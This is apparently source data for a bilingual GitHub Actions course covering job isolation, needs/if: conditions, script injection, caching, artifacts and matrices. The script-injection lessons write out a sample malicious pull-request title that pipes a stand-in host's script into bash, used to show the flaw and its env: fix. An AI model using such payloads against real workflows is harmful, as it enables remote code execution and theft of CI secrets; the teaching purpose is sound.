        why: 'Every job in a workflow runs on its own freshly provisioned runner, and that runner is torn down when the job ends. A downstream job therefore begins on a completely clean machine with no trace of any upstream job — not the checked-out repository, not installed dependencies, not build output, not environment variables. Code that assumes a file produced by an earlier job is present in a later job fails because the file genuinely does not exist there. Anything that must move between jobs has to be transferred explicitly. Files and directories go through the artifact mechanism: the producing job uploads them with the upload-artifact action and the consuming job retrieves them with download-artifact. Small scalar values such as a version string or an image digest are better passed as job outputs, written to the GITHUB_OUTPUT file by a step, declared in the job\'s outputs map, and read by a downstream job through the needs context. Only within a single job do steps share a workspace, so a build-then-test sequence in one job works without any transfer.',
        whyHi: 'Ek workflow mein har job apne freshly provisioned runner par chalti hai, aur wo runner tear down ho jaata hai jab job khatam hota hai. Ek downstream job isliye ek poori tarah clean machine par shuru hota hai jismein kisi bhi upstream job ka koi trace nahi — na checked-out repository, na installed dependencies, na build output. Code jo maanता hai ki ek earlier job dwara produced file ek later job mein present hai fail hota hai kyunki file genuinely wahan exist nahi karti. Kuch bhi jise jobs ke beech move karna hai explicitly transfer hona chahiye. Files aur directories artifact mechanism ke through jaate hain. Chhoti scalar values job outputs ke roop mein pass hoti hain.',
      },
      {
        wrong: `# interpolating an untrusted context value directly into a run script
- run: |
    echo "Processing PR titled: \${{ github.event.pull_request.title }}"
    ./build.sh
# a PR titled  a"; curl evil.sh | bash; echo "  runs arbitrary code on the runner,
# with the workflow's token and any env secrets. this is SCRIPT INJECTION.
# (actionlint flags "github.event.pull_request.title" as potentially untrusted.)`,
        right: `# pass untrusted values through an ENV VAR, never straight into the shell text:
- env:
    PR_TITLE: \${{ github.event.pull_request.title }}   # GitHub sets it as a real env var
  run: |
    echo "Processing PR titled: $PR_TITLE"              # the shell treats it as data, not code
    ./build.sh
# rule: ANY \${{ github.event.* }} / \${{ github.head_ref }} / issue or PR body/title/branch
# that a stranger can control must go via 'env:' (or an action input), not into 'run:' text.
# run 'actionlint' in CI - it catches this class automatically.`,
        why: 'A \`\${{ }}\` expression is substituted into the step by GitHub before the shell sees it, so whatever text the expression evaluates to becomes part of the script source. When the expression reads a field that an outside contributor controls — a pull request title or body, a branch name, an issue comment, the head ref — an attacker can put shell metacharacters in that field and have them execute on the runner as part of the command. The runner at that moment holds the workflow\'s GITHUB_TOKEN and any secrets exposed to the step, so the injected code can push commits, publish packages, or exfiltrate credentials. The fix is to never place an untrusted expression directly in \`run:\` text. Instead bind it to an environment variable in the step\'s \`env:\` block; GitHub sets that variable to the literal value, and referencing it as \`$VAR\` in the script means the shell handles it as a data string with no interpretation of its contents. The same applies to passing such values as inputs to actions. Running actionlint in the pipeline detects this pattern automatically and flags the specific untrusted fields.',
        whyHi: 'Ek \`\${{ }}\` expression GitHub dwara step mein substitute hota hai shell ke dekhne se pehle, to jo bhi text expression evaluate karta hai wo script source ka part ban jaata hai. Jab expression ek field padhta hai jo ek outside contributor control karta hai — ek pull request title ya body, ek branch name — ek attacker us field mein shell metacharacters daal sakta hai aur unhe runner par execute karvा sakta hai. Us moment runner workflow ka GITHUB_TOKEN aur koi bhi secrets rakhta hai. Fix ek untrusted expression ko kabhi directly \`run:\` text mein na rakhna hai. Iske bajaay ise step ke \`env:\` block mein ek environment variable se bind karo; GitHub us variable ko literal value set karta hai, aur ise script mein \`$VAR\` ke roop mein reference karna matlab shell ise ek data string ke roop mein handle karta hai. actionlint is pattern ko automatically detect karta hai.',
      },
      {
        wrong: `# a "notify on failure" job that never runs when things fail
jobs:
  test:    { runs-on: ubuntu-latest, steps: [...] }
  deploy:  { needs: test, runs-on: ubuntu-latest, steps: [...] }
  notify:
    needs: [test, deploy]
    runs-on: ubuntu-latest
    steps:
      - run: ./post-to-slack.sh "pipeline result"
# when 'test' fails: 'deploy' is skipped, and 'notify' (which needs both) is ALSO skipped
# because a needed job failed. you get NO notification exactly when you need one.`,
        right: `# use if: always()  (or failure()) so the job runs regardless of upstream state:
  notify:
    needs: [test, deploy]
    if: always()                    # run even if test/deploy failed or were skipped
    runs-on: ubuntu-latest
    steps:
      - run: |
          # needs.<job>.result is one of: success | failure | cancelled | skipped
          ./post-to-slack.sh "test=\${{ needs.test.result }} deploy=\${{ needs.deploy.result }}"
# same idea for CLEANUP steps inside a job: 'if: always()' so teardown runs after a failure.
# 'if: failure()' = only on failure;  'if: success()' (the default) = only if all green.`,
        why: 'By default a job does not run if any job in its \`needs\` list failed or was skipped, and a step does not run if an earlier step in the same job failed. This default is usually what you want — you do not deploy if the tests failed — but it is exactly wrong for jobs and steps whose entire purpose is to react to failure: a notification job, a cleanup step that tears down test infrastructure, a job that uploads diagnostic logs. Those must run precisely when something upstream went wrong. The \`if:\` condition overrides the default. \`if: always()\` makes the job or step run regardless of the outcome of anything before it, which is right for cleanup and for notifications that should report both success and failure. \`if: failure()\` runs only when something upstream failed, for failure-only alerts. Inside such a job the \`needs.<job>.result\` value — one of success, failure, cancelled, or skipped — lets the notification report what actually happened rather than assuming.',
        whyHi: 'Default se ek job nahi chalti agar iski \`needs\` list mein koi job fail ya skip hui, aur ek step nahi chalta agar same job mein ek earlier step fail hua. Ye default usually wo hai jo aap chahte ho — aap deploy nahi karte agar tests fail hue — par ye un jobs aur steps ke liye exactly galat hai jinka poora purpose failure par react karna hai: ek notification job, ek cleanup step, ek job jo diagnostic logs upload karta hai. Wo theek tab chalne chahiye jab kuch upstream galat gaya. \`if:\` condition default ko override karta hai. \`if: always()\` job ya step ko iske pehle kisi bhi cheez ke outcome ki parwah kiye bina chalata hai. \`if: failure()\` sirf tab chalta hai jab kuch upstream fail hua.',
      },
    ],

    realWorld: [
      {
        en: '**"The deploy job can\'t find the build output"** — asked in some form in every Actions-adopting team\'s first month. The build job produced `dist/`, the deploy job (a fresh runner) looked for `dist/` and found nothing. `upload-artifact` / `download-artifact` between them; done.',
        hi: '**"Deploy job build output nahi dhoondh sakta"** — har Actions-adopting team ke pehle mahine mein kisi form mein poocha jaata hai. build job ne `dist/` produce kiya, deploy job (ek fresh runner) ne `dist/` dhoondha aur kuch nahi mila.',
      },
      {
        en: '**A supply-chain incident from a PR title** — a workflow echoed `${{ github.event.pull_request.title }}` into a `run:` block. An attacker opened a PR with a title containing `$(curl ... | sh)` and the runner executed it with the repo token. Fixed by moving every untrusted context value to `env:` and adding `actionlint` as a required check.',
        hi: '**Ek PR title se ek supply-chain incident** — ek workflow ne `${{ github.event.pull_request.title }}` ko ek `run:` block mein echo kiya. Har untrusted context value ko `env:` mein move karके fix kiya.',
      },
      {
        en: '**Slack alerts went silent for the worst deploys** — the `notify` job `needs: [build, deploy]` with no `if:`, so a failed `deploy` skipped `notify` entirely. Adding `if: always()` and reporting `needs.deploy.result` restored alerts for exactly the runs that mattered.',
        hi: '**Sabse bure deploys ke liye Slack alerts silent ho gaye** — `notify` job `needs: [build, deploy]` bina `if:` ke. `if: always()` add karke restore kiya.',
      },
    ],

    interviewQA: [
      {
        q: 'Explain the job isolation model in GitHub Actions and how you move data between jobs.',
        qHi: 'GitHub Actions mein job isolation model samjhao aur aap jobs ke beech data kaise move karte ho.',
        a: 'A workflow contains jobs, and each job runs on its own freshly provisioned runner — a virtual machine or container — which is destroyed when the job finishes. Jobs run in parallel by default. The consequence is that a downstream job starts on a completely clean machine: it has none of the checked-out code, installed packages, build output, or environment variables from any earlier job. So every job that needs the repository must run its own checkout, and anything that must travel between jobs has to be passed explicitly. There are two mechanisms. For files and directories you use artifacts: the producing job runs the upload-artifact action, the consuming job runs download-artifact, and the artifact also persists after the run for a retention period. For small scalar values like a version number, an image tag, or a digest you use job outputs: a step with an id writes key=value to the file named by the GITHUB_OUTPUT environment variable, the job declares an outputs map referencing that step output, and a downstream job that has the producer in its needs reads it as needs.<job>.outputs.<key>. Within a single job the story is different — steps there do share the filesystem and workspace, so a build step and a later test step in the same job see the same files; and environment variables written to GITHUB_ENV are visible to later steps in that job but not to other jobs.',
        aHi: 'Ek workflow jobs contain karta hai, aur har job apne freshly provisioned runner par chalti hai — ek virtual machine ya container — jo destroy ho jaata hai jab job khatam hota hai. Jobs default se parallel mein chalte hain. Consequence ye hai ki ek downstream job ek poori tarah clean machine par shuru hota hai: iske paas kisi bhi earlier job se koi checked-out code, installed packages, build output, ya environment variables nahi hain. To har job jise repository chahiye apna checkout chalana chahiye, aur kuch bhi jise jobs ke beech travel karna hai explicitly pass hona chahiye. Do mechanisms hain. Files aur directories ke liye aap artifacts use karte ho. Chhoti scalar values ke liye aap job outputs use karte ho. Ek single job ke andar steps filesystem share karte hain.',
      },
      {
        q: 'What does needs do, and how does if: interact with a failed dependency?',
        qHi: 'needs kya karta hai, aur if: ek failed dependency ke saath kaise interact karta hai?',
        a: 'needs turns the flat set of jobs into a directed acyclic graph. Writing needs: build on a job means it will not start until build has completed successfully; needs: [lint, test] waits for both. Jobs with no needs, and jobs whose dependencies are all satisfied, run in parallel, and GitHub derives the whole schedule and the parallelism from the graph — you never declare stages explicitly. By default, if a job in a job\'s needs list failed or was skipped, that job is also skipped, and similarly a step is skipped once an earlier step in its job has failed. The if: condition overrides this. if: always() on a job or step makes it run regardless of upstream outcomes, which is how you write cleanup steps and notification jobs that must execute precisely when something failed. if: failure() runs only when something upstream failed. if: success(), the implicit default, runs only if everything so far succeeded. Inside a job that runs despite failures, the needs.<job>.result value, which is one of success, failure, cancelled, or skipped, lets it report or branch on what actually happened. Note that expressions in if: are written without the dollar-brace wrapper, which is implied.',
        aHi: 'needs jobs ke flat set ko ek directed acyclic graph mein badalta hai. Ek job par needs: build likhna matlab ye start nahi hoga jab tak build successfully complete na ho; needs: [lint, test] dono ka wait karta hai. Jobs jinke paas koi needs nahi, aur jobs jinki dependencies sab satisfied hain, parallel mein chalte hain, aur GitHub poora schedule graph se derive karta hai. Default se, agar ek job ki needs list mein ek job fail ya skip hui, wo job bhi skip ho jaati hai. if: condition ise override karta hai. Ek job ya step par if: always() ise upstream outcomes ki parwah kiye bina chalata hai. if: failure() sirf tab chalta hai jab kuch upstream fail hua. Ek job ke andar jo failures ke bawajood chalti hai, needs.<job>.result value ise report karne deti hai ki actually kya hua.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain the workflow → job → step model, the isolation rule, and both mechanisms for passing data between jobs.',
        taskHi: 'Ek comment mein, workflow → job → step model samjhao.',
        hint: 'WORKFLOW = a YAML file in `.github/workflows/`: a name, `on:` TRIGGERS (`push`, `pull_request`, `workflow_dispatch` [manual button, optional `inputs`], `schedule` [cron], `workflow_call` [reusable], `release`, ...), a map of jobs. JOB = a unit that runs on ONE RUNNER (`runs-on: ubuntu-latest` / `windows-latest` / `macos-latest` / a self-hosted label). All jobs start IN PARALLEL by default. STEP = one thing done in order on that job\'s runner — either `run:` (a shell command) or `uses:` (a reusable ACTION like `actions/checkout`). THE ISOLATION RULE: each job = its OWN freshly-provisioned machine, destroyed when the job ends. A downstream job starts CLEAN — no checked-out code, no `node_modules`, no build output, no env vars from any earlier job. So (a) EVERY job that needs the source runs its own `actions/checkout`; (b) to move anything between jobs, pass it EXPLICITLY: OUTPUTS for small strings (a step with an `id:` does `echo "k=v" >> "$GITHUB_OUTPUT"` → the job declares `outputs: { k: ${{ steps.<id>.outputs.k }} }` → a downstream job reads `${{ needs.<job>.outputs.k }}`); ARTIFACTS for files/dirs (`actions/upload-artifact` in the producer, `actions/download-artifact` in the consumer; also downloadable by a human for a retention period). WITHIN one job, steps DO share the filesystem + workspace; env vars via `echo "K=v" >> "$GITHUB_ENV"` are visible to LATER steps in the SAME job only.',
        hintHi: 'WORKFLOW = `.github/workflows/` mein ek YAML file: ek name, `on:` TRIGGERS, jobs ka ek map. JOB = ek unit jo EK RUNNER par chalti hai. Saare jobs default se PARALLEL start hote hain. STEP = ek cheez jo order mein us job ke runner par hoti hai — ya `run:` ya `uses:` (ek ACTION). ISOLATION RULE: har job = apni freshly-provisioned machine, job khatam hone par destroy. Ek downstream job CLEAN start hota hai — koi checked-out code nahi, koi build output nahi. To (a) HAR job jise source chahiye apna `actions/checkout` chalati hai; (b) jobs ke beech kuch bhi move karne ke liye EXPLICITLY pass karo: OUTPUTS chhoti strings ke liye, ARTIFACTS files/dirs ke liye. EK job ke ANDAR, steps filesystem SHARE karte hain.',
      },
      {
        task: 'In a comment, explain `needs` and the job DAG, and give the four `if:` patterns (default, always(), failure(), success()) with when to use each.',
        taskHi: 'Ek comment mein, `needs` aur job DAG samjhao.',
        hint: '`needs` turns the flat job set into a DIRECTED ACYCLIC GRAPH. `needs: build` = don\'t start until `build` succeeds; `needs: [lint, test]` = wait for both. Jobs with no `needs` (and jobs whose deps are all met) run IN PARALLEL — GitHub derives the schedule + parallelism from the graph; you NEVER declare "stages". `act -l` shows the computed stages (Stage 0 = no deps, Stage 1 = needs a Stage-0 job, ...). DEFAULT: a job whose `needs` job FAILED or was SKIPPED is itself SKIPPED; a step is skipped once an earlier step in its job failed. This is right for `deploy` (don\'t ship if tests failed) but WRONG for jobs/steps whose job is to react to failure. `if:` patterns: (1) DEFAULT (`if: success()`, implicit) — run only if everything so far is green; (2) `if: always()` — run REGARDLESS of upstream outcome → for CLEANUP steps (teardown test infra) and NOTIFY jobs that report both success + failure; (3) `if: failure()` — run ONLY when something upstream failed → failure-only alerts; (4) `if: <expr>` e.g. `github.ref == \'refs/heads/main\'`, `github.event_name == \'push\'`, `startsWith(github.ref, \'refs/tags/v\')` — gate on branch/event/tag. Inside a job that ran despite failure, `needs.<job>.result` (`success`|`failure`|`cancelled`|`skipped`) lets it report what actually happened. NOTE: inside `if:` you write expressions WITHOUT the `${{ }}` wrapper (implied).',
        hintHi: '`needs` flat job set ko ek DIRECTED ACYCLIC GRAPH mein badalta hai. `needs: build` = start mat karo jab tak `build` succeed na ho. Jobs jinke paas koi `needs` nahi PARALLEL chalte hain — GitHub schedule graph se derive karta hai; aap KABHI "stages" declare nahi karte. `act -l` computed stages dikhाता hai. DEFAULT: ek job jiski `needs` job FAIL ya SKIP hui khud SKIP ho jaati hai. `if:` patterns: (1) DEFAULT (`if: success()`, implicit); (2) `if: always()` — upstream outcome ki parwah kiye BINA chalao → CLEANUP steps + NOTIFY jobs ke liye; (3) `if: failure()` — SIRF jab kuch upstream fail hua; (4) `if: <expr>` — branch/event/tag par gate. `needs.<job>.result` = `success`|`failure`|`cancelled`|`skipped`. `if:` ke ANDAR `${{ }}` wrapper ke BINA likho.',
      },
      {
        task: 'In a comment, explain script injection via untrusted `${{ }}` context values in `run:`, why it is dangerous, and the fix.',
        taskHi: 'Ek comment mein, untrusted `${{ }}` context values ke through script injection samjhao.',
        hint: 'A `${{ <expr> }}` is substituted into the step by GitHub BEFORE the shell parses it → whatever the expression evaluates to becomes SCRIPT SOURCE. When the expression reads a field an OUTSIDE CONTRIBUTOR controls — `github.event.pull_request.title`/`.body`, `github.event.issue.title`/comment body, `github.head_ref`, a branch name — an attacker puts shell metacharacters in that field and they EXECUTE on the runner as part of the command. e.g. a PR titled `a"; curl evil.sh | bash; echo "` in `run: echo "PR: ${{ github.event.pull_request.title }}"`. WHY DANGEROUS: at that moment the runner holds the workflow\'s `GITHUB_TOKEN` + any step secrets → the injected code can push commits, publish packages, exfiltrate credentials, pivot. THE FIX: NEVER put an untrusted expression directly in `run:` text. Bind it to an env var in the step\'s `env:` block — `env: { PR_TITLE: ${{ github.event.pull_request.title }} }` — GitHub sets the var to the LITERAL value, and `$PR_TITLE` in the script is handled by the shell as a DATA string, not code. Same for passing such values as action inputs. Run `actionlint` in CI (as a required check) — it flags "potentially untrusted" context fields used in inline scripts automatically. (Ties to Lesson 4 + `pull_request_target`, which makes this far worse by also granting a write token.)',
        hintHi: 'Ek `${{ <expr> }}` GitHub dwara step mein substitute hota hai shell ke parse karne se PEHLE → jo bhi expression evaluate karta hai wo SCRIPT SOURCE ban jaata hai. Jab expression ek field padhta hai jo ek OUTSIDE CONTRIBUTOR control karta hai — PR title/body, branch name — ek attacker us field mein shell metacharacters daalता hai aur wo runner par EXECUTE hote hain. WHY DANGEROUS: us moment runner workflow ka `GITHUB_TOKEN` + step secrets rakhta hai → injected code commits push kar sakta hai, credentials exfiltrate. FIX: KABHI ek untrusted expression directly `run:` text mein mat rakho. Ise step ke `env:` block mein ek env var se bind karo — GitHub var ko LITERAL value set karta hai, aur `$VAR` shell dwara ek DATA string ke roop mein handle hota hai. CI mein `actionlint` chalao — ye ise automatically flag karta hai.',
      },
    ],

    keyTakeaways: [
      'WORKFLOW (`.github/workflows/*.yml`: `name`, `on:` triggers, `jobs`) → JOB (runs on ONE `runs-on` runner; all jobs PARALLEL by default) → STEP (in order on that runner; `run:` a command OR `uses:` a reusable ACTION). Triggers: `push`, `pull_request`, `workflow_dispatch` (manual, optional `inputs`), `schedule` (cron), `workflow_call` (reusable — Lesson 6), `release`, `issue_comment`, ... — filterable by branch / tag / changed path.',
      'THE ISOLATION RULE (the thing people miss): each job = its OWN fresh machine, torn down when the job ends. A downstream job starts CLEAN — no checked-out code, no installed packages, no build output, no env vars from any earlier job. So (a) EVERY job that needs the repo runs its own `actions/checkout`; (b) pass data between jobs EXPLICITLY. WITHIN one job, steps DO share the filesystem; `echo "K=v" >> "$GITHUB_ENV"` reaches LATER steps in the SAME job only.',
      'PASSING DATA BETWEEN JOBS: OUTPUTS for small strings — a step with an `id:` does `echo "k=v" >> "$GITHUB_OUTPUT"`, the job declares `outputs: { k: ${{ steps.<id>.outputs.k }} }`, a downstream job reads `${{ needs.<job>.outputs.k }}`. ARTIFACTS for files/dirs — `actions/upload-artifact` in the producer, `actions/download-artifact` in the consumer (also human-downloadable for a retention period).',
      '`needs` builds a DAG: `needs: build` waits for `build` to succeed; `needs: [lint, test]` waits for both; jobs with no unmet deps run IN PARALLEL and GitHub derives the schedule — you never declare "stages" (`act -l` shows the computed Stage numbers). DEFAULT: a job whose `needs` job FAILED/was SKIPPED is itself SKIPPED; a step is skipped after an earlier step in its job failed. Override with `if:` — `always()` (run regardless → cleanup + notify jobs), `failure()` (only on upstream failure), `success()` (implicit default). `needs.<job>.result` = `success`|`failure`|`cancelled`|`skipped`. Inside `if:` omit the `${{ }}`.',
      'CONTEXTS in `${{ }}` (evaluated by GitHub before the step runs): `github` (`.sha`/`.ref`/`.event_name`/`.actor`/`.event.*`), `env`, `vars` (non-secret config), `secrets` (masked in logs), `steps`, `needs`, `matrix`, `runner`, `inputs`. Functions: `contains`/`startsWith`/`fromJSON` (build dynamic matrices)/`hashFiles` (cache keys)/`success()`/`failure()`/`always()`. SCRIPT-INJECTION RULE: never put an attacker-controllable `${{ github.event.* }}` / `github.head_ref` directly in `run:` text — bind it to an `env:` var (GitHub sets the literal value; the shell treats `$VAR` as data). Run `actionlint` in CI — it flags this automatically.',
    ],
    keyTakeawaysHi: [
      'WORKFLOW (`.github/workflows/*.yml`: `name`, `on:` triggers, `jobs`) → JOB (EK `runs-on` runner par chalti hai; saare jobs default PARALLEL) → STEP (us runner par order mein; `run:` ek command YA `uses:` ek ACTION). Triggers: `push`, `pull_request`, `workflow_dispatch`, `schedule`, `workflow_call`, ...',
      'ISOLATION RULE (jo log miss karte hain): har job = apni fresh machine, job khatam hone par tear down. Ek downstream job CLEAN start hota hai — koi checked-out code nahi, koi build output nahi, koi env vars nahi. To (a) HAR job jise repo chahiye apna `actions/checkout` chalati hai; (b) jobs ke beech data EXPLICITLY pass karo. EK job ke ANDAR, steps filesystem SHARE karte hain.',
      'JOBS KE BEECH DATA PASS KARNA: OUTPUTS chhoti strings ke liye — ek `id:` wala step `echo "k=v" >> "$GITHUB_OUTPUT"`, job `outputs` declare karta hai, downstream job `${{ needs.<job>.outputs.k }}` padhta hai. ARTIFACTS files/dirs ke liye — producer mein `actions/upload-artifact`, consumer mein `actions/download-artifact`.',
      '`needs` ek DAG banata hai: `needs: build` `build` ke succeed hone ka wait karta hai; jobs jinki deps met hain PARALLEL chalte hain aur GitHub schedule derive karta hai — aap kabhi "stages" declare nahi karte. DEFAULT: ek job jiski `needs` job FAIL/SKIP hui khud SKIP ho jaati hai. `if:` se override: `always()` (regardless chalao → cleanup + notify), `failure()`, `success()` (implicit default). `needs.<job>.result` = `success`|`failure`|`cancelled`|`skipped`. `if:` ke andar `${{ }}` chhodo.',
      'CONTEXTS `${{ }}` mein: `github`, `env`, `vars`, `secrets` (logs mein masked), `steps`, `needs`, `matrix`, `runner`, `inputs`. Functions: `contains`/`fromJSON`/`hashFiles`/`success()`/`failure()`/`always()`. SCRIPT-INJECTION RULE: kabhi ek attacker-controllable `${{ github.event.* }}` directly `run:` text mein mat rakho — ise ek `env:` var se bind karo. CI mein `actionlint` chalao.',
    ],
  },

  {
    slug: 'ops-caching-artifacts-matrix-and-keeping-ci-fast',
    title: 'Caching, Artifacts, Matrix & Keeping CI Fast',
    titleHi: 'Caching, Artifacts, Matrix & CI Fast Rakhna',
    description: 'A slow pipeline is a pipeline developers route around. Four levers keep it fast: cache the things that do not change between runs (dependencies, compiler output), build the release artifact once and pass it downstream, run independent work in parallel with a matrix, and cancel superseded runs. Cache and artifact look similar and are not the same thing.',
    descriptionHi: 'Ek slow pipeline ek pipeline hai jiske aas-paas developers route karte hain. Chaar levers ise fast rakhte hain: un cheezon ko cache karo jo runs ke beech nahi badalti (dependencies, compiler output), release artifact ko ek baar build karo aur ise downstream pass karo, independent kaam ko ek matrix ke saath parallel mein chalao, aur superseded runs cancel karo. Cache aur artifact similar dikhte hain aur same cheez nahi hain.',
    difficulty: 'MEDIUM',
    duration: 24,
    order: 3,

    analogy: {
      en: '**A workshop that has learned not to waste time.** The **cache** is the shelf of pre-mixed supplies you keep between jobs — you already bought and measured the flour and sugar last time, so unless the recipe changed you just grab them off the shelf instead of shopping again (dependencies, compiled objects: rebuilt only when their inputs change). The **artifact** is the finished cake you box up and hand to the delivery driver — it is the actual deliverable, produced once, and every downstream stop (taste-test kitchen, then the customer) opens the *same box*; nobody bakes a second cake. A **matrix** is realising you have four identical ovens and four portions to bake, so you run all four at once instead of one after another. And **cancel-in-progress** is: a new order for the same customer just came in, so stop baking the one they already replaced — it is going in the bin anyway.',
      hi: '**Ek workshop jisne samay barbaad na karna seekha hai.** **Cache** pre-mixed supplies ki shelf hai jo aap jobs ke beech rakhte ho — aapne pichhli baar flour aur sugar khareeda aur measure kiya, to jab tak recipe na badle aap unhe shelf se le lete ho shopping ke bajaay (dependencies, compiled objects: sirf tab rebuild jab unke inputs badalte hain). **Artifact** finished cake hai jise aap box karte ho aur delivery driver ko dete ho — ye actual deliverable hai, ek baar produced, aur har downstream stop *same box* kholta hai. Ek **matrix** ye realise karna hai ki aapke paas chaar identical ovens aur chaar portions hain, to aap chaaron ek saath chalate ho. Aur **cancel-in-progress** hai: same customer ke liye ek naya order aa gaya, to jise unhone already replace kiya use bake karna band karo.',
    },

    simple: `**FOUR LEVERS FOR A FAST PIPELINE:**
\`\`\`yaml
# 1. CACHE — restore things that don't change between runs (skip the slow re-fetch/re-build)
- uses: actions/cache@<sha>
  with:
    path: ~/.npm
    key: npm-\${{ runner.os }}-\${{ hashFiles('**/package-lock.json') }}   # exact-match key
    restore-keys: |                                                       # fallback prefixes
      npm-\${{ runner.os }}-
# hit  -> restore, skip 'npm ci' network fetch.  miss -> run, then SAVE under 'key' at job end.
# a cache entry is IMMUTABLE once written for a key; scoped to the branch (+ base branch reads).

# 2. ARTIFACT — persist a real deliverable and hand it to later jobs (build ONCE)
- uses: actions/upload-artifact@<sha>
  with: { name: dist, path: dist/, retention-days: 7 }
# ...downstream job:
- uses: actions/download-artifact@<sha>
  with: { name: dist }

# 3. MATRIX — fan one job out over a set of values, run in parallel
strategy:
  fail-fast: false            # don't cancel the other shards when one fails
  max-parallel: 4
  matrix:
    shard: [1, 2, 3, 4]        # -> 4 parallel jobs, \${{ matrix.shard }} differs in each
    include: [ { shard: 1, extra: coverage } ]     # add/tweak specific combinations
# common uses: test SHARDING (split the suite N ways), multi-version (node 18/20/22), multi-OS.

# 4. CONCURRENCY — one run per group; cancel the older one
concurrency:
  group: \${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true     # a new push to a PR kills the now-stale run
\`\`\`

**CACHE vs ARTIFACT — they look alike, they are NOT the same:**
\`\`\`
                 CACHE                              ARTIFACT
purpose          SPEED — a rebuildable optimisation  a DELIVERABLE — the actual output
if it's missing  the job still works, just slower    the downstream job is BROKEN
identified by    a key (often a hash of inputs)       a name you choose
lifetime         evicted (LRU, ~7 days idle, size cap)  a fixed retention (default 90d), downloadable
correctness      MUST be safe to lose / regenerate    the thing you promote to prod
NEVER cache      secrets, or anything security-sensitive; a poisoned cache = supply-chain risk
\`\`\`

**OTHER SPEED WINS:** run cheap jobs in parallel (no \`needs\`); shard slow suites; only build
the artifact once and promote it (Lesson 1, 5); path filters so a docs-only change skips the
build; a bigger runner for a genuinely CPU-bound step; keep the container image / toolchain warm.`,

    simpleHi: `**FAST PIPELINE KE CHAAR LEVERS:**
\`\`\`yaml
# 1. CACHE — un cheezon ko restore karo jo runs ke beech nahi badalti
- uses: actions/cache@<sha>
  with:
    path: ~/.npm
    key: npm-\${{ runner.os }}-\${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-\${{ runner.os }}-
# hit -> restore, 'npm ci' network fetch skip. miss -> run, phir job end par 'key' ke tahat SAVE.
# ek cache entry ek key ke liye likhne ke baad IMMUTABLE hai; branch ke liye scoped.

# 2. ARTIFACT — ek real deliverable persist karo aur ise later jobs ko do (build EK BAAR)
- uses: actions/upload-artifact@<sha>
  with: { name: dist, path: dist/, retention-days: 7 }
- uses: actions/download-artifact@<sha>
  with: { name: dist }

# 3. MATRIX — ek job ko values ke ek set par fan out karo, parallel mein chalao
strategy:
  fail-fast: false
  matrix:
    shard: [1, 2, 3, 4]        # -> 4 parallel jobs
# common uses: test SHARDING, multi-version (node 18/20/22), multi-OS.

# 4. CONCURRENCY — per group ek run; purane ko cancel karo
concurrency:
  group: \${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: true
\`\`\`

**CACHE vs ARTIFACT — dikhte alike hain, same NAHI hain:**
\`\`\`
                 CACHE                              ARTIFACT
purpose          SPEED — ek rebuildable optimisation  ek DELIVERABLE — actual output
agar missing hai  job phir bhi kaam karta hai, bas slow  downstream job BROKEN hai
identified by     ek key (often inputs ka hash)         ek name jo aap chunte ho
lifetime          evicted (LRU, ~7 days idle, size cap)  ek fixed retention (default 90d)
correctness       khone/regenerate karne ke liye SAFE   wo cheez jo aap prod mein promote karte ho
KABHI cache MAT KARO   secrets; ek poisoned cache = supply-chain risk
\`\`\``,

    content: `## Why speed is a correctness issue

A CI pipeline that takes twenty minutes is not just annoying — it changes behaviour. Developers stop waiting for it, merge before it finishes, batch several changes into one push to amortise the wait, or add \`[skip ci]\`. Every one of those defeats the purpose of CI. A pipeline that returns in two or three minutes is one people actually use as a feedback loop. Keeping it fast is part of keeping CI working at all.

## Caching

A **cache** stores the result of a slow, deterministic step so the next run can skip it. The archetype is dependency installation: \`npm ci\`, \`pip install\`, \`go mod download\`, \`bundle install\` fetch the same packages every run, and the network fetch dominates the time.

\`actions/cache\` works on a **key**:

- **\`key\`** — an exact-match identifier. It almost always contains a **hash of the inputs**, via \`hashFiles('**/package-lock.json')\`, so the key changes only when the dependency set changes.
- **\`restore-keys\`** — ordered fallback **prefixes**. If the exact \`key\` misses, the most recent cache whose key starts with a restore-key prefix is restored (a partial hit — usually still a big win, since most dependencies are unchanged).
- On a **hit**, the \`path\` is restored and you skip the fetch. On a **miss**, the step runs normally, and at the end of the job the \`path\` is **saved** under \`key\`.

Two rules matter:

- A cache entry is **immutable once written for a key**. You cannot update the cache for \`key\` \`abc\` — you write a *new* key. This is why keys are hashes of inputs, not static strings: a static key would capture a stale cache forever.
- Caches are **scoped to a branch**. A branch can read its own caches and caches from its base branch, but not from unrelated branches. This prevents one branch poisoning another.

**Never cache secrets or anything an attacker could tamper with to affect a build** — a writable, shared cache is a supply-chain attack surface (a poisoned \`node_modules\` cache runs on every subsequent build).

## Artifacts

An **artifact** is a file or directory that a job **produces as a real output** and that must be available to later jobs or to a human. The build stage compiles the application and uploads the result; the deploy stage downloads that exact result. \`retention-days\` controls how long it is kept (default 90); artifacts are also downloadable from the run\'s page.

The **build once** principle lives here: the pipeline builds the release artifact in one job, uploads it, and every downstream job — integration tests, staging deploy, production deploy — downloads and uses the *same* artifact. Nothing is ever rebuilt for a specific environment, so the thing in production is byte-for-byte the thing that was tested (Lessons 1 and 5).

### Cache versus artifact

They use similar-looking actions but are conceptually opposite:

| | cache | artifact |
|---|---|---|
| what it is | a speed optimisation | a deliverable |
| if it is missing | job still works, slower | downstream job breaks |
| keyed by | a hash of inputs | a name you choose |
| lifetime | evicted (LRU, size cap, ~7-day idle) | fixed retention, downloadable |
| must it be correct | no — safe to lose and regenerate | yes — it is what you ship |

A useful test: if losing it only makes the pipeline slower, it is a cache; if losing it breaks the pipeline, it is an artifact.

## Matrix

A **matrix** fans one job definition out over a set of parameter values, running one job per combination in parallel:

\`\`\`yaml
strategy:
  fail-fast: false            # default true: one failure cancels the siblings. false: let them all finish.
  max-parallel: 4             # cap concurrent matrix jobs
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [18, 20, 22]        # -> 2 x 3 = 6 jobs
    include:                  # add extra combinations, or extra keys to existing ones
      - { os: ubuntu-latest, node: 22, coverage: true }
    exclude:                  # remove specific combinations
      - { os: windows-latest, node: 18 }
\`\`\`

The common uses:

- **Compatibility** — test the same code against several language or OS versions.
- **Test sharding** — \`matrix: { shard: [1,2,3,4] }\` and have the test runner execute only its shard (\`--shard=\${{ matrix.shard }}/4\`). A ten-minute suite split four ways returns in about three. \`fail-fast: false\` is usual here so one shard's failure does not hide the others'.
